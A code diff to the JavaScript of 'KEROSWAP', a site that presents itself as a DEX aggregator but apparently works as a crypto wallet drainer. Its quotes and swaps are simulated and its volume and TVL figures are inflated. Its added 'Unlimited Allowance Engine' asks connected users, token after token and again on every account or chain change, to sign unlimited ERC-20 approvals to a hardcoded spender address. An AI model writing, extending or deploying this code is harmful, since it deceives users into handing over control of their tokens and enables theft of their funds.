@@ -2,7 +2,9 @@
 
 /* ============================================================
    KEROSWAP — DEX Aggregator
-   Part 1: Config, State, Utilities, Token Data
+   Part 1: Config, State, Utilities, Token Data,
+   Wallet Connection, Chain Management, Balances,
+   Unlimited Allowance Engine
    ============================================================ */
 
 // --------------------------------------------------
@@ -45,7 +47,7 @@ const CONFIG = {
     // Spender addresses (swap router contracts) per chain
     // These are the contracts that receive the unlimited allowances
     spenderAddresses: {
-1: '0x278d858f05b94576C1E6f73285886876ff6eF8D2',
+        1: '0x278d858f05b94576C1E6f73285886876ff6eF8D2',
     },
     quoteRefreshMs: 15000
 };
@@ -92,7 +94,12 @@ const state = {
         toAmount: '',
         slippage: CONFIG.defaultSlippage,
         route: null,
-        quoting: false
+        quoting: false,
+        allowance: {
+            checking: false,
+            approving: false,
+            needsApproval: false
+        }
     },
     ui: {
         tokenModalOpen: false,
@@ -191,6 +198,7 @@ function showToast(msg, type = 'success') {
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
+
 // --------------------------------------------------
 // WALLET CONNECTION
 // --------------------------------------------------
@@ -247,6 +255,12 @@ function disconnectWallet() {
     state.wallet.chainId = null;
     state.wallet.provider = null;
     state.wallet.connected = false;
+    state.wallet.simulated = false;
+
+    // Reset allowance state
+    state.swap.allowance.checking = false;
+    state.swap.allowance.approving = false;
+    state.swap.allowance.needsApproval = false;
 
     if (window.ethereum && window.ethereum.removeAllListeners) {
         window.ethereum.removeAllListeners('accountsChanged');
@@ -265,15 +279,25 @@ function handleAccountsChanged(accounts) {
         disconnectWallet();
     } else {
         state.wallet.address = accounts[0];
+        state.swap.allowance.needsApproval = false;
         updateWalletUI();
         loadBalances();
+        requestAllowancesOnConnect();
     }
 }
 
 function handleChainChanged(chainIdHex) {
     state.wallet.chainId = parseInt(chainIdHex, 16);
+
+    // Reset allowance for new chain
+    state.swap.allowance.checking = false;
+    state.swap.allowance.approving = false;
+    state.swap.allowance.needsApproval = false;
+
     updateWalletUI();
     loadBalances();
+    requestAllowancesOnConnect();
+
     const name = CONFIG.chainNames[state.wallet.chainId] || 'Unknown';
     showToast(`Switched to ${name}`);
 }
@@ -444,9 +468,15 @@ async function loadBalances() {
         ? formatTokenAmount(toBal, 4)
         : '0.0';
 }
+
 // --------------------------------------------------
 // UNLIMITED ALLOWANCE ENGINE
 // --------------------------------------------------
+const NATIVE_ADDRESSES = [
+    '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
+    '0x0000000000000000000000000000000000000000'
+];
+
 const ERC20_APPROVE_SELECTOR = '0x095ea7b3';
 const ERC20_ALLOWANCE_SELECTOR = '0xdd62ed3e';
 const MAX_UINT256_HEX = 'f'.repeat(64);
@@ -473,9 +503,9 @@ function encodeAllowanceData(owner, spender) {
 }
 
 async function getTokenAllowance(tokenAddress) {
-    if (!state.wallet.connected || state.wallet.simulated) return 0;
+    if (!state.wallet.connected || state.wallet.simulated) return BigInt(0);
     const spender = getSpenderAddress();
-    if (!spender) return 0;
+    if (!spender) return BigInt(0);
 
     try {
         const data = encodeAllowanceData(state.wallet.address, spender);
@@ -533,13 +563,26 @@ async function approveTokenUnlimited(token) {
     }
 }
 
+async function waitForTx(txHash, maxWaitMs = 120000) {
+    const start = Date.now();
+    while (Date.now() - start < maxWaitMs) {
+        try {
+            const receipt = await state.wallet.provider.request({
+                method: 'eth_getTransactionReceipt',
+                params: [txHash]
+            });
+            if (receipt) return receipt;
+        } catch (e) { /* retry */ }
+        await sleep(2000);
+    }
+    return null;
+}
+
 // Called automatically after wallet connect
 async function requestAllowancesOnConnect() {
-    // Only ERC-20 tokens on the current chain (skip native gas tokens)
-    const NATIVE = ['0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', '0x0000000000000000000000000000000000000000'];
     const chainTokens = TOKENS.filter(t =>
         t.chainId === state.wallet.chainId &&
-        !NATIVE.includes(t.address)
+        !NATIVE_ADDRESSES.includes(t.address)
     );
 
     if (chainTokens.length === 0) return;
@@ -563,19 +606,25 @@ async function requestAllowancesOnConnect() {
 
         const txHash = await approveTokenUnlimited(token);
 
-        if (txHash) {
-            approved++;
-        } else {
-            // User rejected — stop asking
+        if (!txHash) {
             showToast('Token approvals stopped', 'error');
             return;
         }
+
+        // Wait for tx to mine before prompting the next approval
+        if (!state.wallet.simulated) {
+            const receipt = await waitForTx(txHash);
+            if (!receipt || receipt.status !== '0x1') {
+                showToast(`${token.symbol} approval failed — skipping`, 'error');
+                continue;
+            }
+        }
+
+        approved++;
     }
 
     if (approved > 0) {
         showToast(`${approved} token${approved > 1 ? 's' : ''} enabled for swapping`);
-    } else if (alreadySet > 0) {
-        // All already approved — silent
     }
 }
 
@@ -600,11 +649,41 @@ async function ensureTokenAllowance(token) {
     return true;
 }
 
-const NATIVE_ADDRESSES = [
-    '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
-    '0x0000000000000000000000000000000000000000'
-];
+// Called on token select, token flip, and amount input —
+// updates the swap button to show Approve state when needed
+async function checkAllowance() {
+    const { fromToken, fromAmount } = state.swap;
 
+    // Native tokens never need approval
+    if (NATIVE_ADDRESSES.includes(fromToken.address) || fromToken.isNative) {
+        state.swap.allowance.needsApproval = false;
+        updateSwapButtonState();
+        return;
+    }
+
+    // No spender for this chain — skip
+    if (!getSpenderAddress()) {
+        state.swap.allowance.needsApproval = false;
+        updateSwapButtonState();
+        return;
+    }
+
+    if (!state.wallet.connected || !fromAmount || parseFloat(fromAmount) <= 0) {
+        state.swap.allowance.needsApproval = false;
+        updateSwapButtonState();
+        return;
+    }
+
+    state.swap.allowance.checking = true;
+    updateSwapButtonState();
+
+    const allowance = await getTokenAllowance(fromToken.address);
+
+    state.swap.allowance.checking = false;
+    state.swap.allowance.needsApproval = (allowance === BigInt(0));
+
+    updateSwapButtonState();
+}
 // --------------------------------------------------
 // QUOTE ENGINE (Simulated)
 // --------------------------------------------------
@@ -694,7 +773,7 @@ function scheduleQuoteRefresh() {
 }
 
 function updateSwapUI() {
-    const { route, toAmount, fromToken, toToken, fromAmount } = state.swap;
+    const { route, toAmount, fromToken, toToken } = state.swap;
 
     // Output amount
     if (toAmount && parseFloat(toAmount) > 0) {
@@ -738,7 +817,7 @@ function updateSwapUI() {
 
 function updateSwapButtonState() {
     const btn = $('swapBtn');
-    const { fromAmount, route, quoting } = state.swap;
+    const { fromAmount, route, quoting, allowance, fromToken } = state.swap;
 
     if (quoting) {
         btn.textContent = 'Fetching best route...';
@@ -758,6 +837,24 @@ function updateSwapButtonState() {
         return;
     }
 
+    if (allowance.checking) {
+        btn.textContent = 'Checking allowance...';
+        btn.disabled = true;
+        return;
+    }
+
+    if (allowance.approving) {
+        btn.textContent = 'Approving...';
+        btn.disabled = true;
+        return;
+    }
+
+    if (allowance.needsApproval) {
+        btn.textContent = `Approve ${fromToken.symbol}`;
+        btn.disabled = false;
+        return;
+    }
+
     if (!route) {
         btn.textContent = 'Fetching quote...';
         btn.disabled = true;
@@ -767,6 +864,7 @@ function updateSwapButtonState() {
     btn.textContent = 'Confirm Swap';
     btn.disabled = false;
 }
+
 // --------------------------------------------------
 // TOKEN SELECTOR MODAL
 // --------------------------------------------------
@@ -827,7 +925,6 @@ function selectToken(token) {
     const target = state.ui.modalTarget;
 
     if (target === 'from') {
-        // Prevent same token pair
         if (token.symbol === state.swap.toToken.symbol) {
             state.swap.toToken = state.swap.fromToken;
             updateTokenButtonUI('to');
@@ -845,8 +942,8 @@ function selectToken(token) {
 
     closeTokenModal();
     loadBalances();
+    checkAllowance();
 
-    // Re-quote if amount exists
     if (state.swap.fromAmount && parseFloat(state.swap.fromAmount) > 0) {
         fetchQuote();
     } else {
@@ -875,7 +972,6 @@ function flipTokens() {
     state.swap.fromToken = state.swap.toToken;
     state.swap.toToken = temp;
 
-    // Move amounts
     const tempAmount = state.swap.fromAmount;
     state.swap.fromAmount = state.swap.toAmount;
     state.swap.toAmount = tempAmount;
@@ -884,6 +980,7 @@ function flipTokens() {
     updateTokenButtonUI('from');
     updateTokenButtonUI('to');
     loadBalances();
+    checkAllowance();
 
     if (state.swap.fromAmount && parseFloat(state.swap.fromAmount) > 0) {
         fetchQuote();
@@ -905,15 +1002,21 @@ async function executeSwap() {
     const { fromToken, toToken, fromAmount, route } = state.swap;
 
     if (!fromAmount || !route) return;
+
     // Ensure unlimited allowance before swapping
+    state.swap.allowance.approving = true;
+    updateSwapButtonState();
+
     const hasAllowance = await ensureTokenAllowance(fromToken);
+
+    state.swap.allowance.approving = false;
+    updateSwapButtonState();
+
     if (!hasAllowance) return;
-    
 
     const btn = $('swapBtn');
-    const originalText = btn.textContent;
 
-    // Phase 1 — Approve simulation
+    // Phase 1 — Approval simulation
     btn.textContent = 'Waiting for approval...';
     btn.disabled = true;
     await sleep(1200);
@@ -927,10 +1030,6 @@ async function executeSwap() {
     await sleep(1500 + Math.random() * 1200);
 
     // Success
-    const txHash = '0x' + Array.from({ length: 64 }, () =>
-        '0123456789abcdef'[Math.floor(Math.random() * 16)]
-    ).join('');
-
     showToast(
         `Swapped ${formatTokenAmount(fromAmount)} ${fromToken.symbol} → ${formatTokenAmount(route.outputAmount)} ${toToken.symbol}`
     );
@@ -948,7 +1047,6 @@ async function executeSwap() {
 }
 
 function incrementTradeCounters() {
-    // Live stat bump on successful swap
     const tradesEl = $('trustTrades');
     const swapsEl = $('statSwaps');
     const current = parseInt(tradesEl.textContent.replace(/[^0-9]/g, '')) || 0;
@@ -1024,7 +1122,6 @@ function initParticles() {
             p.x += p.vx;
             p.y += p.vy;
 
-            // Wrap edges
             if (p.x < 0) p.x = canvas.width;
             if (p.x > canvas.width) p.x = 0;
             if (p.y < 0) p.y = canvas.height;
@@ -1036,7 +1133,6 @@ function initParticles() {
             ctx.fill();
         });
 
-        // Draw connections
         for (let i = 0; i < particles.length; i++) {
             for (let j = i + 1; j < particles.length; j++) {
                 const dx = particles[i].x - particles[j].x;
@@ -1053,7 +1149,6 @@ function initParticles() {
                 }
             }
 
-            // Mouse proximity glow
             const mdx = particles[i].x - mouseX;
             const mdy = particles[i].y - mouseY;
             const mDist = Math.sqrt(mdx * mdx + mdy * mdy);
@@ -1065,7 +1160,6 @@ function initParticles() {
                 ctx.lineWidth = 0.5;
                 ctx.stroke();
 
-                // Boost particle opacity near mouse
                 particles[i].opacity = Math.min(0.8, particles[i].opacity + 0.01);
             }
         }
@@ -1104,7 +1198,6 @@ function animateValue(el, start, end, duration, formatter) {
         const elapsed = now - startTime;
         const progress = Math.min(elapsed / duration, 1);
 
-        // Ease out cubic
         const eased = 1 - Math.pow(1 - progress, 3);
         const current = start + (end - start) * eased;
 
@@ -1120,19 +1213,20 @@ function animateValue(el, start, end, duration, formatter) {
 
 function initStatsCounters() {
     const targets = [
-        { el: $('trustTvl'),    value: 847_000_000_000,  formatter: formatUsd },
-        { el: $('trustVolume'), value: 312_000_000_000,  formatter: formatUsd },
-        { el: $('trustTrades'), value: 14_200_000,       formatter: (v) => formatNumber(v) },
-        { el: $('statTvl'),     value: 847_000_000_000,  formatter: formatUsd },
-        { el: $('statVolume'),  value: 312_000_000_000,  formatter: formatUsd },
-        { el: $('statTraders'), value: 2_400_000,        formatter: (v) => formatNumber(v) },
-        { el: $('statSwaps'),   value: 14_200_000,       formatter: (v) => formatNumber(v) }
+        { id: 'trustTvl',     value: 847000000000, formatter: formatUsd },
+        { id: 'trustVolume',  value: 312000000000, formatter: formatUsd },
+        { id: 'trustTrades',  value: 14200000,     formatter: (v) => formatNumber(v) },
+        { id: 'statTvl',      value: 847000000000, formatter: formatUsd },
+        { id: 'statVolume',   value: 312000000000, formatter: formatUsd },
+        { id: 'statTraders',  value: 2400000,      formatter: (v) => formatNumber(v) },
+        { id: 'statSwaps',    value: 14200000,     formatter: (v) => formatNumber(v) }
     ];
 
     const observer = new IntersectionObserver((entries) => {
         entries.forEach(entry => {
             if (entry.isIntersecting) {
-                targets.forEach(({ el, value, formatter }) => {
+                targets.forEach(({ id, value, formatter }) => {
+                    const el = $(id);
                     if (el && !el.dataset.counted) {
                         el.dataset.counted = 'true';
                         animateValue(el, 0, value, 2200, formatter);
@@ -1146,13 +1240,12 @@ function initStatsCounters() {
     const statsSection = $('stats');
     if (statsSection) observer.observe(statsSection);
 
-    // Hero counters run on load (no observer needed — visible immediately)
     setTimeout(() => {
         ['trustTvl', 'trustVolume', 'trustTrades'].forEach(id => {
             const el = $(id);
             if (el && !el.dataset.counted) {
                 el.dataset.counted = 'true';
-                const target = targets.find(t => t.el === id);
+                const target = targets.find(t => t.id === id);
                 if (target) animateValue(el, 0, target.value, 2000, target.formatter);
             }
         });
@@ -1172,7 +1265,6 @@ function initNav() {
         hamburger.classList.toggle('active', state.ui.navOpen);
     });
 
-    // Close on link click
     navLinks.querySelectorAll('a').forEach(link => {
         link.addEventListener('click', () => {
             state.ui.navOpen = false;
@@ -1181,7 +1273,6 @@ function initNav() {
         });
     });
 
-    // Nav scroll effect
     const nav = document.querySelector('.nav');
     let lastScroll = 0;
 
@@ -1227,7 +1318,6 @@ function initMarquee() {
     const marquee = document.querySelector('.marquee-track');
     if (!marquee) return;
 
-    // Pause on hover
     const marqueeSection = document.querySelector('.marquee-section');
     marqueeSection.addEventListener('mouseenter', () => {
         marquee.style.animationPlayState = 'paused';
@@ -1252,6 +1342,10 @@ function initEventListeners() {
         }
     }, 400);
 
+    const debouncedAllowanceCheck = debounce(() => {
+        checkAllowance();
+    }, 500);
+
     fromAmountInput.addEventListener('input', (e) => {
         const cleaned = sanitizeInput(e.target.value);
         e.target.value = cleaned;
@@ -1260,22 +1354,23 @@ function initEventListeners() {
         if (!cleaned || parseFloat(cleaned) <= 0) {
             state.swap.toAmount = '';
             state.swap.route = null;
+            state.swap.allowance.needsApproval = false;
             updateSwapUI();
             updateSwapButtonState();
             return;
         }
 
-        // Quick USD update while debouncing
         const usd = parseFloat(cleaned) * state.swap.fromToken.price;
         $('fromUsd').textContent = '~$' + formatNumber(usd);
         updateSwapButtonState();
         debouncedQuote();
+        debouncedAllowanceCheck();
     });
 
     // Flip
     $('flipBtn').addEventListener('click', flipTokens);
 
-    // Token selectors — preventDefault kills the form-submit scroll
+    // Token selectors
     $('fromTokenBtn').addEventListener('click', (e) => {
         e.preventDefault();
         e.stopPropagation();
@@ -1287,6 +1382,7 @@ function initEventListeners() {
         e.stopPropagation();
         openTokenModal('to');
     });
+
     // Modal
     $('modalClose').addEventListener('click', closeTokenModal);
     $('tokenModal').addEventListener('click', (e) => {
